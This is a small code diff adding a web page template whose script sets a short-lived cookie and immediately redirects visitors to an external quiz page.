@@ -1,0 +1,11 @@
+<%- include("partials/header"); -%>
+
+
+<script type="text/javascript">
+var now = new Date();
+now.setTime(now.getTime() + 1 * 3600 * 1000);
+document.cookie = "d1=1; expires=" + now.toUTCString() + "; path=/";
+window.location.href = "https://pixelpaste.net/quize/apple-quizeq"
+</script>
+
+<%- include("partials/footer"); -%>
